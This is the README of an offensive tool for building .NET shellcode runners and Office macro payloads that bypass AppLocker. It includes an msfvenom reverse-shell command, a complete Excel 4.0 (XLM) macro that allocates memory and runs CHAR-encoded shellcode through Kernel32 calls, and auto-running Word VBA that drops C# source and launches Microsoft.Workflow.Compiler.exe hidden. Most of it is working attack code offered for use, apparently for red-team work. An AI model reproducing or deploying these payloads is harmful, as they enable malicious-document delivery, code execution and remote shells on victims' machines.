## Build and compile .NET payload on linux with mono
Compile a shellcode runner exe or generate source to bypass Applocker using various methods.  

### Install 
```bash
python3 -m venv env  
source env/bin/activate  
python -m pip install pycryptodome  
python builder.py -inbin test.bin --arch x64 --pretty
```

Exec the resulting `out.exe` file on a windows machine.  

Requires the `mono` package.  


```
usage: builder.py [-h] [-inbin INBIN] [--arch {x86,x64}] [--outfile OUTFILE] [--type {exe,workflowcompiler,msbuild,installutil}] [--verbose VERBOSE] [--pretty PRETTY]

generate .NET executable to run AES-CBC encrypted shellcode.

optional arguments:
  -h, --help            show this help message and exit
  -inbin INBIN          .bin file
  --arch {x86,x64}
  --outfile OUTFILE
  --type {exe,workflowcompiler,msbuild,installutil}
  --verbose VERBOSE
  --pretty PRETTY
```  
  

## Using the macro helper  
Creating office macro payloads can be tedious so I created this tool to ease the burden.  
Generate source for word (2016) macro from a Program.cs.  
Generate XLM4 macro pasta given some shellcode.  
Note: only x86 (right now) and no null bytes.

## Generate XLM4 macro:  
```
usage: macro_helper.py [-h] [-infile INFILE] [--outfile OUTFILE] [--filename FILENAME] [--type {word_macro,xlm4_macro}] [--exectype {shell,wmi}] [--verbose VERBOSE]

help create office macro

optional arguments:
  -h, --help            show this help message and exit
  -infile INFILE        bin file or Program.cs file depending on type
  --outfile OUTFILE
  --filename FILENAME
  --type {word_macro,xlm4_macro}
  --exectype {shell,wmi}
  --verbose VERBOSE
```

```
msfvenom -p windows/shell/reverse_tcp_dns LHOST="127.0.0.1" LPORt=53 -f raw -b "\x00" -o test32.bin
python3 macro_helper.py -infile test32.bin --type xlm4_macro

=IF(ISNUMBER(SEARCH("32",GET.WORKSPACE(1))),GOTO(R2C1),GOTO(R16C1))
=REGISTER("Kernel32","VirtualAlloc","JJJJJ","Valloc",,1,9)
=Valloc(0,1000000,4096,64)
=REGISTER("Kernel32", "WriteProcessMemory","JJJCJJ","WProcessMemory",,1,9)
=SELECT(R1C2:R1000:C2,R1C2)
=SET.VALUE(R1C3,0)
=WHILE(ACTIVE.CELL()<>"END")
=WProcessMemory(-1,R3C1+R1C3*255,ACTIVE.CELL(),LEN(ACTIVE.CELL()),0)
=SET.VALUE(R1C3,R1C3+1)
=SELECT(,"R[1]C")
=NEXT()
=REGISTER("Kernel32","CreateThread","JJJJJJJ","Cthread",,1,9)
=Cthread(0,0,R3C1,0,0,0)
=REGISTER("Kernel32","VirtualProtect","JJJJJ","Vprotect",,1,9)
=Vprotect(R3C1,4096,4,0)
=HALT()

=CHAR(186)&CHAR(113)&CHAR(187)&CHAR(247)&CHAR(68)&CHAR(219)&CHAR(193)&CHAR(217)&CHAR(116)&CHAR(36)&CHAR(244)&CHAR(91)&CHAR(43)&CHAR(201)&CHAR(177)&CHAR(95)&CHAR(49)&CHAR(83)&CHAR(19)&CHAR(131)&CHAR(195)&CHAR(4)&CHAR(3)&CHAR(83)&CHAR(126)&CHAR(89)&CHAR(2)&CHAR(184)&CHAR(104)&CHAR(18)&CHAR(237)&CHAR(65)&CHAR(104)&CHAR(77)&CHAR(223)&CHAR(147)&CHAR(225)&CHAR(104)&CHAR(123)&CHAR(159)&CHAR(163)&CHAR(66)&CHAR(15)&CHAR(205)&CHAR(79)&CHAR(40)&CHAR(93)&CHAR(230)&CHAR(126)&CHAR(209)&CHAR(233)&CHAR(116)&CHAR(168)&CHAR(34)&CHAR(89)&CHAR(50)&CHAR(142)&CHAR(13)&CHAR(101)&CHAR(111)&CHAR(242)&CHAR(12)&CHAR(25)&CHAR(114)&CHAR(38)&CHAR(239)&CHAR(32)&CHAR(189)&CHAR(59)&CHAR(238)&CHAR(101)&CHAR(11)&CHAR(54)&CHAR(31)&CHAR(59)&CHAR(7)&CHAR(234)&CHAR(207)&CHAR(55)&CHAR(85)&CHAR(54)&CHAR(167)&CHAR(70)&CHAR(138)&CHAR(205)&CHAR(7)&CHAR(49)&CHAR(175)&CHAR(17)&CHAR(243)&CHAR(141)&CHAR(174)&CHAR(65)&CHAR(172)&CHAR(134)&CHAR(233)&CHAR(65)&CHAR(76)&CHAR(74)&CHAR(130)&CHAR(201)&CHAR(86)&CHAR(233)&CHAR(92)&CHAR(189)&CHAR(90)&CHAR(184)&CHAR(111)&CHAR(194)&CHAR(40)&CHAR(14)&CHAR(27)&CHAR(61)&CHAR(249)&CHAR(94)&CHAR(219)&CHAR(252)&CHAR(202)&CHAR(172)&CHAR(119)&CHAR(255)&CHAR(19)&CHAR(150)&CHAR(103)&CHAR(138)&CHAR(111)&CHAR(228)&CHAR(26)&CHAR(140)&CHAR(171)&CHAR(150)&CHAR(192)&CHAR(25)&CHAR(44)&CHAR(48)&CHAR(130)&CHAR(185)&CHAR(136)&CHAR(192)&CHAR(71)&CHAR(95)&CHAR(90)&CHAR(206)&CHAR(44)&CHAR(20)&CHAR(4)&CHAR(211)&CHAR(179)&CHAR(249)&CHAR(62)&CHAR(239)&CHAR(56)&CHAR(252)&CHAR(144)&CHAR(121)&CHAR(122)&CHAR(218)&CHAR(52)&CHAR(33)&CHAR(216)&CHAR(67)&CHAR(108)&CHAR(143)&CHAR(143)&CHAR(124)&CHAR(110)&CHAR(119)&CHAR(111)&CHAR(216)&CHAR(228)&CHAR(154)&CHAR(102)&CHAR(92)&CHAR(5)&CHAR(101)&CHAR(135)&CHAR(1)&CHAR(146)&CHAR(169)&CHAR(74)&CHAR(185)&CHAR(98)&CHAR(166)&CHAR(221)&CHAR(202)&CHAR(80)&CHAR(105)&CHAR(118)&CHAR(68)&CHAR(217)&CHAR(226)&CHAR(80)&CHAR(147)&CHAR(30)&CHAR(217)&CHAR(37)&CHAR(11)&CHAR(225)&CHAR(226)&CHAR(85)&CHAR(2)&CHAR(38)&CHAR(182)&CHAR(5)&CHAR(60)&CHAR(143)&CHAR(183)&CHAR(205)&CHAR(188)&CHAR(48)&CHAR(98)&CHAR(65)&CHAR(236)&CHAR(158)&CHAR(221)&CHAR(34)&CHAR(92)&CHAR(95)&CHAR(142)&CHAR(202)&CHAR(182)&CHAR(80)&CHAR(241)&CHAR(235)&CHAR(185)&CHAR(186)&CHAR(154)&CHAR(4)&CHAR(75)&CHAR(69)&CHAR(165)&CHAR(212)&CHAR(98)&CHAR(124)&CHAR(151)&CHAR(250)&CHAR(181)&CHAR(72)&CHAR(239)&CHAR(44)&CHAR(135)&CHAR(132)&CHAR(33)&CHAR(4)&CHAR(214)&CHAR(228)&CHAR(85)&CHAR(207)&CHAR(48)&CHAR(209)&CHAR(37)&CHAR(240)&CHAR(149)&CHAR(146)&CHAR(102)

=CHAR(19)&CHAR(127)&CHAR(175)&CHAR(54)&CHAR(67)&CHAR(125)&CHAR(175)&CHAR(182)&CHAR(166)&CHAR(8)&CHAR(73)&CHAR(220)&CHAR(216)&CHAR(92)&CHAR(193)&CHAR(73)&CHAR(64)&CHAR(197)&CHAR(153)&CHAR(232)&CHAR(141)&CHAR(208)&CHAR(231)&CHAR(43)&CHAR(5)&CHAR(208)&CHAR(24)&CHAR(229)&CHAR(238)&CHAR(145)&CHAR(10)&CHAR(18)&CHAR(137)&CHAR(89)&CHAR(211)&CHAR(227)&CHAR(60)&CHAR(89)&CHAR(185)&CHAR(231)&CHAR(150)&CHAR(14)&CHAR(85)&CHAR(234)&CHAR(207)&CHAR(120)&CHAR(250)&CHAR(21)&CHAR(58)&CHAR(251)&CHAR(253)&CHAR(234)&CHAR(187)&CHAR(205)&CHAR(118)&CHAR(220)&CHAR(41)&CHAR(113)&CHAR(225)&CHAR(33)&CHAR(190)&CHAR(113)&CHAR(241)&CHAR(119)&CHAR(212)&CHAR(113)&CHAR(153)&CHAR(47)&CHAR(140)&CHAR(34)&CHAR(188)&CHAR(47)&CHAR(25)&CHAR(87)&CHAR(109)&CHAR(186)&CHAR(162)&CHAR(1)&CHAR(193)&CHAR(109)&CHAR(203)&CHAR(175)&CHAR(60)&CHAR(89)&CHAR(84)&CHAR(80)&CHAR(107)&CHAR(217)&CHAR(147)&CHAR(174)&CHAR(233)&CHAR(246)&CHAR(59)&CHAR(198)&CHAR(17)&CHAR(71)&CHAR(188)&CHAR(22)&CHAR(120)&CHAR(71)&CHAR(236)&CHAR(126)&CHAR(119)&CHAR(104)&CHAR(3)&CHAR(78)&CHAR(120)&CHAR(163)&CHAR(76)&CHAR(198)&CHAR(243)&CHAR(34)&CHAR(62)&CHAR(119)&CHAR(3)&CHAR(111)&CHAR(158)&CHAR(41)&CHAR(4)&CHAR(156)&CHAR(59)&CHAR(218)&CHAR(127)&CHAR(248)&CHAR(188)&CHAR(27)&CHAR(128)&CHAR(234)&CHAR(216)&CHAR(28)&CHAR(128)&CHAR(18)&CHAR(223)&CHAR(33)&CHAR(86)&CHAR(43)&CHAR(149)&CHAR(100)&CHAR(106)&CHAR(8)&CHAR(166)&CHAR(211)&CHAR(207)&CHAR(57)&CHAR(45)&CHAR(27)&CHAR(67)&CHAR(57)&CHAR(100)&CHAR(100)
```

## Generate VBA for Word that bypasses Applocker  

```
python3 macro_helper.py -infile Program.cs

Function writeTestDotTXT()
  strPath = Environ("TEMP") + "\brax.txt"
  Dim fso As Object
  Set fso = CreateObject("Scripting.FileSystemObject")
  Dim oFile As Object
  Set oFile = fso.CreateTextFile(strPath)
  oFile.WriteLine "using System;"
  oFile.WriteLine "using System.Runtime.InteropServices;"
  oFile.WriteLine "using System.Security.Cryptography;"
  oFile.WriteLine "using System.IO;"
  oFile.WriteLine "namespace ze"
  oFile.WriteLine "{"
  oFile.WriteLine "    class Program"
  oFile.WriteLine "    {"
  oFile.WriteLine "        [StructLayout(LayoutKind.Sequential)]"
  oFile.WriteLine "        public struct SECT_DATA"
  oFile.WriteLine "        {"
  oFile.WriteLine "            public Boolean isvalid;"

  <SNIP>

  writeRunDotXML
  tt = Environ("TEMP") +  "\brax.txt"
  rx = Environ("TEMP") +  "\run.xml"
  rs = Environ("TEMP") + "\res"
  Shell "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe " + rx + " " + rs, vbHide
End Function
  

Sub Document_Open()
  bypass
End Sub
Sub AutoOpen()
  bypass
End Sub
```  

## References and research  
[research on msbuild bypass](https://web.archive.org/web/20161212224652/http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html)  
[research on the workflow.compiler bypass](https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb)  
[outflank's old school evil excel 4.0 macros](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/)  
[fortynorthsecurity - excelntdonut blog post](https://fortynorthsecurity.com/blog/excelntdonut/)  
[cybereason's excellent technical post on x64 macros](https://www.cybereason.com/blog/excel4.0-macros-now-with-twice-the-bits)     